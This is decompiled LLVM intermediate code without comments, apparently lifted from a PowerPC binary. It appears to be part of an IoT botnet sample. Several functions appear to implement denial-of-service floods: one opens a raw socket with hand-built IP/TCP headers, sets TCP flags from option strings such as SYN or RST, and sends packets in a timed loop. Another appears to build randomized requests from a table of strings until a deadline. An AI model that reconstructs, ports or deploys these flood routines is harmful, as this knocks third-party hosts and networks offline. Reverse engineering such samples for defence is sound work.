  %v2_1000907c = load i32, i32* %v1_1000907c, align 4
  %v3_10009080 = icmp eq i32 %v2_1000907c, 115
  br i1 %v3_10009080, label %dec_label_pc_100090c0, label %dec_label_pc_10009088

dec_label_pc_10009088:                            ; preds = %dec_label_pc_10009074
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10009098 = load i32, i32* %v1_10008fd4, align 4
  %v2_100090a0 = call i32 @function_10008adc(i32 %v2_10009098, i32 %v2_10008d04)
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008da4, align 1
  br label %dec_label_pc_10009cc8

dec_label_pc_100090c0:                            ; preds = %dec_label_pc_10008fe4, %dec_label_pc_10009074
  store i8 1, i8* %v2_10008d50, align 4
  store i32 %v1_10008d08, i32* %r9.global-to-local, align 4
  store i32 0, i32* %v1_10008d0c, align 4
  br label %dec_label_pc_10009cc8

dec_label_pc_10009cc8:                            ; preds = %dec_label_pc_10008f50, %dec_label_pc_10008d40, %dec_label_pc_100090c0, %dec_label_pc_10009088, %dec_label_pc_10008f34, %dec_label_pc_10008ef8
  %v1_10009ccc = add nuw nsw i32 %storemerge45, 1
  %v2_10009cdc = icmp slt i32 %v1_10009ccc, 512
  br i1 %v2_10009cdc, label %dec_label_pc_10008cf8, label %dec_label_pc_10008cec

; uselistorder directives
  uselistorder i8* %v2_10008eb8, { 1, 0, 2 }
  uselistorder i8* %v2_10008e88, { 1, 0, 2 }
  uselistorder i32 %v1_10008dc4, { 1, 0, 2, 3 }
  uselistorder i8* %v2_10008da4, { 3, 0, 1, 2, 4 }
  uselistorder i8 %v3_10008d50, { 1, 0 }
  uselistorder i32 %v2_10008d04, { 7, 9, 8, 10, 11, 12, 14, 13, 15, 0, 1, 2, 4, 3, 6, 5, 19, 17, 16, 18, 21, 20, 23, 22, 24 }
  uselistorder i32 %storemerge45, { 3, 1, 0, 2 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v1_10008c18, { 0, 4, 1, 3, 5, 2, 6, 7 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 42, 35, 36, 37, 38, 39, 40, 41, 46, 43, 44, 45 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009cc8, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_100090c0, { 1, 0 }
  uselistorder label %dec_label_pc_10008d40, { 1, 0 }
  uselistorder label %dec_label_pc_10008cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10008c54, { 1, 0 }
}

define i32 @function_10009ce8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009ce8:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009ce8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009ce8, i32* %stack_var_-112, align 4
  %v5_10009ce8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10009ce8, i32* @r31, align 4
  %v2_10009d08 = ptrtoint i8** %stack_var_-100 to i32
  %v2_10009d50 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_10009cfc

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009dec, %dec_label_pc_10009ce8
  br label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009cfc, %dec_label_pc_10009d08
  %storemerge34 = phi i32 [ 0, %dec_label_pc_10009cfc ], [ %v1_10009dd8, %dec_label_pc_10009d08 ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10009d38 = mul i32 %storemerge34, 4
  %v2_10009d3c = add i32 %v1_10009d38, ptrtoint ([162 x i8*]* @global_var_1002b2e4.607 to i32)
  %v1_10009d40 = inttoptr i32 %v2_10009d3c to i32*
  %v2_10009d40 = load i32, i32* %v1_10009d40, align 4
  store i32 %v2_10009d40, i32* @r4, align 4
  %v3_10009d50 = call i32 @function_1000dddc(i8* %v2_10009d50, i32 %v2_10009d40)
  store i32 268475744, i32* @lr, align 4
  %v1_10009d5c = call i32 @function_1000f904(i32 %v2_10009d08)
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v2_10009da0 = load i32, i32* %v1_10009d40, align 4
  store i32 %v2_10009da0, i32* @r4, align 4
  %v3_10009db0 = call i32 @function_1000dddc(i8* %v2_10009d50, i32 %v2_10009da0)
  store i32 ptrtoint (i32* @global_var_10018c94.612 to i32), i32* @r4, align 4
  %v3_10009dc4 = call i32 @function_1000dddc(i8* %v2_10009d50, i32 ptrtoint (i32* @global_var_10018c94.612 to i32))
  store i32 268475860, i32* @lr, align 4
  %v1_10009dd0 = call i32 @function_1000f904(i32 %v2_10009d08)
  %v1_10009dd8 = add nuw nsw i32 %storemerge34, 1
  %tmp13 = icmp slt i32 %v1_10009dd8, 9
  br i1 %tmp13, label %dec_label_pc_10009d08, label %dec_label_pc_10009dec

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009d08
  store i32 268475892, i32* @lr, align 4
  %v1_10009df0 = call i32 @function_1000fdd8(i32 5)
  br label %dec_label_pc_10009cfc

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_1000f904, { 1, 0 }
  uselistorder [3 x i8]* @global_var_10017138.32, { 1, 0 }
  uselistorder label %dec_label_pc_10009d08, { 1, 0 }
}

define i32 @function_10009df8(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10009df8:
  %stack_var_-576 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  store i32 268475988, i32* @lr, align 4
  %v1_10009e50 = call i32 @function_1000c78c(i32 0)
  %v2_10009e5c = add i32 %v1_10009e50, %arg5
  store i32 268476008, i32* @lr, align 4
  %v1_10009e64 = call i32 @function_1000f3cc(i32 %v1_10009e50)
  %v2_10009e7c = srem i32 %v1_10009e64, 3
  %v1_10009e98 = mul nsw i32 %v2_10009e7c, 4
  %v2_10009e9c = ptrtoint i32* %stack_var_-600 to i32
  %v2_10009ea0 = add i32 %v2_10009e9c, 12
  %v1_10009ea4 = add i32 %v2_10009ea0, %v1_10009e98
  store i32 268476080, i32* @lr, align 4
  %v1_10009eac = call i32 @function_1000f3cc(i32 %v1_10009ea4)
  %v2_10009ec8 = srem i32 %v1_10009eac, 108
  %v1_10009eec = mul nsw i32 %v2_10009ec8, 4
  %v2_10009ef0 = add i32 %v1_10009eec, ptrtoint ([105 x i8*]* @global_var_1002b140.619 to i32)
  %v1_10009ef4 = inttoptr i32 %v2_10009ef0 to i32*
  %v2_10009ef4 = load i32, i32* %v1_10009ef4, align 4
  %v2_10009ef8 = ptrtoint i32* %stack_var_-576 to i32
  store i32 %v2_10009ef8, i32* @r3, align 4
  %v0_10009f10 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10009f20.621 to i32), i32* @lr, align 4
  %v9_10009f1c = call i32 @function_1000c868(i32 %v2_10009ef8, i32 ptrtoint ([62 x i8]* @global_var_10018cc0.620 to i32), i32 %arg2, i32 %arg4, i32 %v0_10009f10, i32 %v2_10009ef4, i32 268566528, i32 %v2_10009ec8)
  %v2_1000a00c8 = icmp sgt i32 %arg6, 0
  br i1 %v2_1000a00c8, label %dec_label_pc_10009f2c.lr.ph, label %dec_label_pc_1000a014

dec_label_pc_10009f2c.lr.ph:                      ; preds = %dec_label_pc_10009df8
  br label %dec_label_pc_10009f2c

dec_label_pc_10009f2c:                            ; preds = %dec_label_pc_10009f2c.lr.ph, %dec_label_pc_10009ff8
  %storemerge311 = phi i32 [ 0, %dec_label_pc_10009f2c.lr.ph ], [ %v1_10009ffc, %dec_label_pc_10009ff8 ]
  store i32 268476208, i32* @lr, align 4
  %v0_10009f2c = call i32 @function_1000c384()
  %v3_10009f34 = icmp eq i32 %v0_10009f2c, 0
  br i1 %v3_10009f34, label %dec_label_pc_10009ff8, label %dec_label_pc_10009fd8.preheader

dec_label_pc_10009fd8.preheader:                  ; preds = %dec_label_pc_10009f2c
  store i32 268476384, i32* @lr, align 4
  %v1_10009fdc4 = call i32 @function_1000c78c(i32 0)
  %v2_10009fe85 = icmp slt i32 %v1_10009fdc4, %v2_10009e5c
  br i1 %v2_10009fe85, label %dec_label_pc_10009f40, label %dec_label_pc_10009ff0

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009fd8.preheader, %dec_label_pc_10009fd8.backedge
  %v3_10009f54 = call i32 @function_10000238(i32 %arg1, i16 %arg3)
  store i32 %v3_10009f54, i32* %stack_var_-600, align 4
  %v3_10009f64 = icmp eq i32 %v3_10009f54, 0
  br i1 %v3_10009f64, label %dec_label_pc_10009fd8.backedge, label %dec_label_pc_10009f6c

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f40
  store i32 %v2_10009ef8, i32* @r3, align 4
  %v0_10009f74 = call i32 @function_1000df60()
  %v3_10009f80 = load i32, i32* %stack_var_-600, align 4
  store i32 268476304, i32* @lr, align 4
  %v2_10009f8c = call i32 @function_1000c7dc(i32 %v3_10009f80, i32 %v2_10009ef8)
  %v3_10009f94 = load i32, i32* %stack_var_-600, align 4
  store i32 268476324, i32* @lr, align 4
  %v1_10009fa0 = call i32 @function_1000c63c(i32 %v3_10009f94)
  %v3_10009fa4 = load i32, i32* %stack_var_-600, align 4
  store i32 268476332, i32* @lr, align 4
  %v1_10009fa8 = call i32 @function_1000c2f4(i32 %v3_10009fa4)
  store i32 %v2_10009ef8, i32* @r3, align 4
  %v0_10009fb4 = call i32 @function_1000df60()
  %v3_10009fc0 = load i32, i32* %stack_var_-600, align 4
  store i32 268476368, i32* @lr, align 4
  %v2_10009fcc = call i32 @function_1000c7dc(i32 %v3_10009fc0, i32 %v2_10009ef8)
  %v3_10009fd0 = load i32, i32* %stack_var_-600, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009fd8.622 to i32), i32* @lr, align 4
  %v1_10009fd4 = call i32 @function_1000c2f4(i32 %v3_10009fd0)
  br label %dec_label_pc_10009fd8.backedge

dec_label_pc_10009fd8.backedge:                   ; preds = %dec_label_pc_10009f6c, %dec_label_pc_10009f40
  store i32 268476384, i32* @lr, align 4
  %v1_10009fdc = call i32 @function_1000c78c(i32 0)
  %v2_10009fe8 = icmp slt i32 %v1_10009fdc, %v2_10009e5c
  br i1 %v2_10009fe8, label %dec_label_pc_10009f40, label %dec_label_pc_10009ff0

dec_label_pc_10009ff0:                            ; preds = %dec_label_pc_10009fd8.backedge, %dec_label_pc_10009fd8.preheader
  %v0_10009ff4 = call i32 @function_1000fc20()
  br label %dec_label_pc_10009ff8

dec_label_pc_10009ff8:                            ; preds = %dec_label_pc_10009f2c, %dec_label_pc_10009ff0
  %v0_1000a02c13 = phi i32 [ 0, %dec_label_pc_10009f2c ], [ %v0_10009ff4, %dec_label_pc_10009ff0 ]
  %v1_10009ffc = add nuw nsw i32 %storemerge311, 1
  %v2_1000a00c = icmp slt i32 %v1_10009ffc, %arg6
  br i1 %v2_1000a00c, label %dec_label_pc_10009f2c, label %dec_label_pc_1000a014

dec_label_pc_1000a014:                            ; preds = %dec_label_pc_10009ff8, %dec_label_pc_10009df8
  %v0_1000a02c = phi i32 [ %v9_10009f1c, %dec_label_pc_10009df8 ], [ %v0_1000a02c13, %dec_label_pc_10009ff8 ]
  ret i32 %v0_1000a02c

; uselistorder directives
  uselistorder i32 %v2_10009ef8, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_10009e5c, { 1, 0 }
  uselistorder i32 %v1_10009e50, { 1, 0 }
  uselistorder i32 268476384, { 1, 0 }
  uselistorder i32 (i32)* @function_1000f3cc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10009ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10009f40, { 1, 0 }
  uselistorder label %dec_label_pc_10009f2c, { 1, 0 }
}

define i32 @function_1000a030(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000a030:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000a030 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000a030, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_1000a080 = icmp eq i32 %arg2, 0
  br i1 %v3_1000a080, label %dec_label_pc_1000a088, label %dec_label_pc_1000a09c

dec_label_pc_1000a088:                            ; preds = %dec_label_pc_1000a030
  %v0_1000a088 = call i32 @function_10000468()
  br label %dec_label_pc_1000a0b4

dec_label_pc_1000a09c:                            ; preds = %dec_label_pc_1000a030
  %v1_1000a0a0 = urem i32 %arg2, 65536
  store i32 %v1_1000a0a0, i32* @r3, align 4
  %v1_1000a0a8 = call i32 @function_1000e698(i32 %v1_1000a0a0)
  br label %dec_label_pc_1000a0b4

dec_label_pc_1000a0b4:                            ; preds = %dec_label_pc_1000a088, %dec_label_pc_1000a09c
  %v2_1000a0b4 = ptrtoint i32* %stack_var_-92 to i32
  %v4_1000a0c4 = call i32 @function_100020c0(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_1000a0b4)
  %v3_1000a0cc = icmp eq i32 %v4_1000a0c4, 0
  br i1 %v3_1000a0cc, label %dec_label_pc_1000a0d8, label %dec_label_pc_1000a600

dec_label_pc_1000a0d8:                            ; preds = %dec_label_pc_1000a0b4
  store i32 268476672, i32* @lr, align 4
  %v3_1000a0fc = call i32 @function_1000ed5c(i32 2, i32 3, i32 6)
  %v3_1000a10c = icmp eq i32 %v3_1000a0fc, 0
  br i1 %v3_1000a10c, label %dec_label_pc_1000a600, label %dec_label_pc_1000a118

dec_label_pc_1000a118:                            ; preds = %dec_label_pc_1000a0d8
  store i32 1, i32* %stack_var_-76, align 4
  %v2_1000a120 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268476732, i32* @lr, align 4
  %v5_1000a138 = call i32 @function_1000ed20(i32 %v3_1000a0fc, i32 0, i32 3, i32 %v2_1000a120, i32 4)
  %tmp59 = icmp sgt i32 %v5_1000a138, -1
  br i1 %tmp59, label %dec_label_pc_1000a14c, label %dec_label_pc_1000a600

dec_label_pc_1000a14c:                            ; preds = %dec_label_pc_1000a118
  %v3_1000a150 = icmp eq i32 %arg7, 0
  br i1 %v3_1000a150, label %dec_label_pc_1000a17c, label %dec_label_pc_1000a164

dec_label_pc_1000a164:                            ; preds = %dec_label_pc_1000a14c
  %v1_1000a168 = sub i32 32, %arg7
  %v2_1000a170 = urem i32 %v1_1000a168, 64
  %v1_1000a174 = shl i32 -1, %v2_1000a170
  br label %dec_label_pc_1000a17c

dec_label_pc_1000a17c:                            ; preds = %dec_label_pc_1000a14c, %dec_label_pc_1000a164
  %storemerge9 = phi i32 [ %v1_1000a174, %dec_label_pc_1000a164 ], [ 0, %dec_label_pc_1000a14c ]
  %v1_1000a180 = add i32 %arg5, 40
  %v1_1000a190 = add i32 %arg5, 70
  %v1_1000a194 = and i32 %v1_1000a190, -16
  %v2_1000a19c = load i32, i32* %stack_var_-128, align 4
  %v1_1000a1a4 = load i32, i32* @r1, align 4
  %v3_1000a1a4 = sub i32 %v1_1000a1a4, %v1_1000a194
  %v4_1000a1a4 = inttoptr i32 %v3_1000a1a4 to i32*
  store i32 %v2_1000a19c, i32* %v4_1000a1a4, align 4
  %v1_1000a1b4 = add i32 %v3_1000a1a4, 23
  %v1_1000a1b8 = and i32 %v1_1000a1b4, -16
  %v1_1000a1d8 = add i32 %v1_1000a1b8, 20
  %v5_1000a1dc = inttoptr i32 %v1_1000a1d8 to i16*
  %v3_1000a1e0 = load i32, i32* %stack_var_-88, align 4
  %v1_1000a1e8 = call i32 @function_10008730(i32 %storemerge9)
  store i32 %v1_1000a1e8, i32* @r3, align 4
  %v1_1000a1f4 = call i32 @function_1000e694(i32 %v1_1000a1e8)
  %v1_1000a200 = add i32 %arg5, 20
  %v6_1000a218 = inttoptr i32 %v1_1000a1b8 to i32*
  %v7_1000a218 = call i32 @function_100089f0(i32* %v6_1000a218, i32 %v3_1000a1e0, i32 %v1_1000a1f4, i32 6, i32 %v1_1000a200, i32 %arg5)
  %v0_1000a21c = call i32 @function_10000468()
  %v1_1000a22c = trunc i32 %v0_1000a21c to i16
  store i16 %v1_1000a22c, i16* %v5_1000a1dc, align 4
  %v0_1000a230 = call i32 @function_10000468()
  %v2_1000a23c = add i32 %v1_1000a1b8, 24
  %v3_1000a23c = inttoptr i32 %v2_1000a23c to i32*
  store i32 %v0_1000a230, i32* %v3_1000a23c, align 8
  %v2_1000a248 = add i32 %v1_1000a1b8, 28
  %v3_1000a248 = inttoptr i32 %v2_1000a248 to i32*
  store i32 0, i32* %v3_1000a248, align 4
  %v1_1000a250 = add i32 %v1_1000a1b8, 32
  %v2_1000a250 = inttoptr i32 %v1_1000a250 to i32*
  %v1_1000a258 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000a25c = add i32 %v1_1000a1b8, 32
  %v3_1000a25c = inttoptr i32 %v2_1000a25c to i32*
  store i32 %v1_1000a258, i32* %v3_1000a25c, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10018d00.623 to i32), i32* @r4, align 4
  %v3_1000a270 = inttoptr i32 %arg4 to i8*
  %v4_1000a270 = call i32 @function_1000df0c(i8* %v3_1000a270, i32 ptrtoint ([4 x i8]* @global_var_10018d00.623 to i32))
  %v3_1000a278 = icmp eq i32 %v4_1000a270, 0
  br i1 %v3_1000a278, label %dec_label_pc_1000a280, label %dec_label_pc_1000a2d4

dec_label_pc_1000a280:                            ; preds = %dec_label_pc_1000a17c
  %v3_1000a284 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a2c8 = or i32 %v3_1000a284, 2031616
  store i32 %v1_1000a2c8, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a418

dec_label_pc_1000a2d4:                            ; preds = %dec_label_pc_1000a17c
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268477160, i32* @lr, align 4
  %v3_1000a2e4 = call i32 @function_1000e454(i32 %arg4, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000a41018 = icmp eq i32 %v3_1000a2e4, 0
  br i1 %v3_1000a41018, label %dec_label_pc_1000a418, label %dec_label_pc_1000a2f4

dec_label_pc_1000a2f4:                            ; preds = %dec_label_pc_1000a2d4, %dec_label_pc_1000a3f4
  %storemerge1319 = phi i32 [ %v3_1000a400, %dec_label_pc_1000a3f4 ], [ %v3_1000a2e4, %dec_label_pc_1000a2d4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10018d08.625 to i32), i32* @r4, align 4
  %v3_1000a304 = inttoptr i32 %storemerge1319 to i8*
  %v4_1000a304 = call i32 @function_1000df0c(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018d08.625 to i32))
  %v3_1000a30c = icmp eq i32 %v4_1000a304, 0
  br i1 %v3_1000a30c, label %dec_label_pc_1000a314, label %dec_label_pc_1000a328

dec_label_pc_1000a314:                            ; preds = %dec_label_pc_1000a2f4
  %v3_1000a318 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a31c = or i32 %v3_1000a318, 131072
  store i32 %v1_1000a31c, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a328:                            ; preds = %dec_label_pc_1000a2f4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d0c.626 to i32), i32* @r4, align 4
  %v4_1000a338 = call i32 @function_1000df0c(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018d0c.626 to i32))
  %v3_1000a340 = icmp eq i32 %v4_1000a338, 0
  br i1 %v3_1000a340, label %dec_label_pc_1000a348, label %dec_label_pc_1000a35c

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a328
  %v3_1000a34c = load i32, i32* %v2_1000a250, align 16
  %v1_1000a350 = or i32 %v3_1000a34c, 262144
  store i32 %v1_1000a350, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a35c:                            ; preds = %dec_label_pc_1000a328
  store i32 ptrtoint ([4 x i8]* @global_var_10018d10.627 to i32), i32* @r4, align 4
  %v4_1000a36c = call i32 @function_1000df0c(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018d10.627 to i32))
  %v3_1000a374 = icmp eq i32 %v4_1000a36c, 0
  br i1 %v3_1000a374, label %dec_label_pc_1000a37c, label %dec_label_pc_1000a390

dec_label_pc_1000a37c:                            ; preds = %dec_label_pc_1000a35c
  %v3_1000a380 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a384 = or i32 %v3_1000a380, 65536
  store i32 %v1_1000a384, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a390:                            ; preds = %dec_label_pc_1000a35c
  store i32 ptrtoint ([4 x i8]* @global_var_10018d14.628 to i32), i32* @r4, align 4
  %v4_1000a3a0 = call i32 @function_1000df0c(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018d14.628 to i32))
  %v3_1000a3a8 = icmp eq i32 %v4_1000a3a0, 0
  br i1 %v3_1000a3a8, label %dec_label_pc_1000a3b0, label %dec_label_pc_1000a3c4

dec_label_pc_1000a3b0:                            ; preds = %dec_label_pc_1000a390
  %v3_1000a3b4 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a3b8 = or i32 %v3_1000a3b4, 1048576
  store i32 %v1_1000a3b8, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a390
  store i32 ptrtoint ([4 x i8]* @global_var_10018d18.629 to i32), i32* @r4, align 4
  %v4_1000a3d4 = call i32 @function_1000df0c(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018d18.629 to i32))
  %v3_1000a3dc = icmp eq i32 %v4_1000a3d4, 0
  br i1 %v3_1000a3dc, label %dec_label_pc_1000a3e4, label %dec_label_pc_1000a3f4

dec_label_pc_1000a3e4:                            ; preds = %dec_label_pc_1000a3c4
  %v3_1000a3e8 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a3ec = or i32 %v3_1000a3e8, 524288
  store i32 %v1_1000a3ec, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a3f4:                            ; preds = %dec_label_pc_1000a3c4, %dec_label_pc_1000a3b0, %dec_label_pc_1000a37c, %dec_label_pc_1000a348, %dec_label_pc_1000a314, %dec_label_pc_1000a3e4
  store i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32* @r4, align 4
  store i32 268477444, i32* @lr, align 4
  %v3_1000a400 = call i32 @function_1000e454(i32 0, i32 ptrtoint (i32* @global_var_10018d04.624 to i32), i32 268566528)
  %v3_1000a410 = icmp eq i32 %v3_1000a400, 0
  br i1 %v3_1000a410, label %dec_label_pc_1000a418, label %dec_label_pc_1000a2f4

dec_label_pc_1000a418:                            ; preds = %dec_label_pc_1000a3f4, %dec_label_pc_1000a2d4, %dec_label_pc_1000a280
  %v0_1000a418 = call i32 @function_10000468()
  %v1_1000a428 = trunc i32 %v0_1000a418 to i16
  %v3_1000a428 = add i32 %v1_1000a1b8, 34
  %v4_1000a428 = inttoptr i32 %v3_1000a428 to i16*
  store i16 %v1_1000a428, i16* %v4_1000a428, align 2
  %v3_1000a434 = add i32 %v1_1000a1b8, 36
  %v4_1000a434 = inttoptr i32 %v3_1000a434 to i16*
  store i16 0, i16* %v4_1000a434, align 4
  %v3_1000a440 = add i32 %v1_1000a1b8, 38
  %v4_1000a440 = inttoptr i32 %v3_1000a440 to i16*
  store i16 0, i16* %v4_1000a440, align 2
  br i1 %v3_1000a080, label %dec_label_pc_1000a450, label %dec_label_pc_1000a464

dec_label_pc_1000a450:                            ; preds = %dec_label_pc_1000a418
  %v0_1000a450 = call i32 @function_10000468()
  %extract.t63 = trunc i32 %v0_1000a450 to i16
  br label %dec_label_pc_1000a47c

dec_label_pc_1000a464:                            ; preds = %dec_label_pc_1000a418
  %v1_1000a468 = urem i32 %arg2, 65536
  store i32 %v1_1000a468, i32* @r3, align 4
  %v1_1000a470 = call i32 @function_1000e698(i32 %v1_1000a468)
  %extract.t = trunc i32 %v1_1000a470 to i16
  br label %dec_label_pc_1000a47c

dec_label_pc_1000a47c:                            ; preds = %dec_label_pc_1000a450, %dec_label_pc_1000a464
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_1000a464 ], [ %extract.t63, %dec_label_pc_1000a450 ]
  %v3_1000a484 = add i32 %v1_1000a1b8, 22
  %v4_1000a484 = inttoptr i32 %v3_1000a484 to i16*
  store i16 %storemerge60.off0, i16* %v4_1000a484, align 2
  store i32 268477588, i32* @lr, align 4
  %v3_1000a490 = inttoptr i32 %v1_1000a1d8 to i32*
  %v4_1000a490 = call i32 @function_100088e0(i32 %v1_1000a1b8, i32* %v3_1000a490, i32 %v1_1000a1d8)
  %v1_1000a49c = trunc i32 %v4_1000a490 to i16
  store i16 %v1_1000a49c, i16* %v4_1000a434, align 4
  %v1_1000a4ac = or i32 %v1_1000a1b8, 2
  %v2_1000a4ac = inttoptr i32 %v1_1000a4ac to i16*
  %v3_1000a4ac = load i16, i16* %v2_1000a4ac, align 2
  %v4_1000a4ac = zext i16 %v3_1000a4ac to i32
  %v5_1000a4bc = inttoptr i32 %v1_1000a1b8 to i16*
  %v6_1000a4bc = call i32 @function_100087a0(i16* %v5_1000a4bc, i32 %v4_1000a4ac, i32 %v1_1000a1b8, i32 6, i32 %v1_1000a200)
  %sext3 = mul i32 %v6_1000a4bc, 65536
  %v1_1000a4c0 = sdiv i32 %sext3, 65536
  %v1_1000a4c8 = trunc i32 %v1_1000a4c0 to i16
  %v3_1000a4c8 = or i32 %v1_1000a1b8, 10
  %v4_1000a4c8 = inttoptr i32 %v3_1000a4c8 to i16*
  store i16 %v1_1000a4c8, i16* %v4_1000a4c8, align 2
  store i32 268477652, i32* @lr, align 4
  %v1_1000a4d0 = call i32 @function_1000c78c(i32 0)
  %v2_1000a4dc = add i32 %v1_1000a4d0, %arg3
  %v2_1000a530 = or i32 %v1_1000a1b8, 12
  %v3_1000a530 = inttoptr i32 %v2_1000a530 to i32*
  %v3_1000a544 = or i32 %v1_1000a1b8, 4
  %v4_1000a544 = inttoptr i32 %v3_1000a544 to i16*
  br label %dec_label_pc_1000a4f0

dec_label_pc_1000a4f0:                            ; preds = %dec_label_pc_1000a4f0.backedge, %dec_label_pc_1000a47c
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_1000a47c ], [ %storemerge22, %dec_label_pc_1000a4f0.backedge ]
  store i32 268477716, i32* @lr, align 4
  %v7_1000a510 = call i32 @function_1000ece0(i32 %v3_1000a0fc, i32 %v1_1000a1b8, i32 %v1_1000a180, i32 0, i32 %v2_1000a0b4, i32 16, i32 %v2_1000a0b4)
  %v1_1000a518 = call i32 @function_10008730(i32 %storemerge9)
  store i32 %v1_1000a518, i32* @r3, align 4
  %v1_1000a524 = call i32 @function_1000e694(i32 %v1_1000a518)
  store i32 %v1_1000a524, i32* %v3_1000a530, align 4
  %v0_1000a534 = call i32 @function_10000468()
  %v1_1000a544 = trunc i32 %v0_1000a534 to i16
  store i16 %v1_1000a544, i16* %v4_1000a544, align 4
  %v0_1000a548 = call i32 @function_10000468()
  store i32 %v0_1000a548, i32* %v3_1000a23c, align 8
  %v0_1000a558 = call i32 @function_10000468()
  %v1_1000a568 = trunc i32 %v0_1000a558 to i16
  store i16 %v1_1000a568, i16* %v5_1000a1dc, align 4
  store i16 0, i16* %v4_1000a434, align 4
  store i32 268477828, i32* @lr, align 4
  %v4_1000a580 = call i32 @function_100088e0(i32 %v1_1000a1b8, i32* %v3_1000a490, i32 %v1_1000a1d8)
  %v1_1000a58c = trunc i32 %v4_1000a580 to i16
  store i16 %v1_1000a58c, i16* %v4_1000a434, align 4
  %v3_1000a59c = load i16, i16* %v2_1000a4ac, align 2
  %v4_1000a59c = zext i16 %v3_1000a59c to i32
  %v6_1000a5ac = call i32 @function_100087a0(i16* %v5_1000a4bc, i32 %v4_1000a59c, i32 %v1_1000a1b8, i32 0, i32 %v2_1000a0b4)
  %v1_1000a5b8 = trunc i32 %v6_1000a5ac to i16
  store i16 %v1_1000a5b8, i16* %v4_1000a4c8, align 2
  %v4_1000a5c4 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_1000a5c4, label %dec_label_pc_1000a5cc, label %dec_label_pc_1000a5f0

dec_label_pc_1000a5cc:                            ; preds = %dec_label_pc_1000a4f0
  store i32 268477908, i32* @lr, align 4
  %v1_1000a5d0 = call i32 @function_1000c78c(i32 0)
  %v3_1000a5dc = icmp sgt i32 %v1_1000a5d0, %v2_1000a4dc
  br i1 %v3_1000a5dc, label %dec_label_pc_1000a600, label %dec_label_pc_1000a4f0.backedge

